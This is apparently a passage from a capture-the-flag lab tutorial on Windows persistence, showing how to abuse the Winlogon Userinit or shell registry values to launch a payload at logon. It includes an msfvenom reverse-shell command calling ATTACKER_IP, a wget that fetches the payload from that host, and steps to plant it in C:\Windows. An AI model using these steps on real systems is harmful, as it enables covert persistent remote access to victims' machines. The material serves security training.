Winlogon:

Another alternative to automatically start programs on logon is abusing Winlogon, the Windows component that loads your user profile right after authentication (amongst other things).

Winlogon uses some registry keys under HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ that could be interesting to gain persistence:

Userinit points to userinit.exe, which is in charge of restoring your user profile preferences.
shell points to the system's shell, which is usually explorer.exe.
Winlogon registry

If we'd replace any of the executables with some reverse shell, we would break the logon sequence, which isn't desired. Interestingly, you can append commands separated by a comma, and Winlogon will process them all.

Let's start by creating a shell:

AttackBox
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4452 -f exe -o revshell.exe
We'll transfer the shell to our victim machine as we did previously. We can then copy the shell to any directory we like. 

     Windows Powershell:
        -wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe

Command Prompt
C:\> move revshell.exe C:\Windows
We then alter either shell or Userinit in HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\. In this case we will use Userinit, but the procedure with shell is the same.

Note: While both shell and Userinit could be used to achieve persistence in a real-world scenario, to get the flag in this room, you will need to use Userinit.

After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).
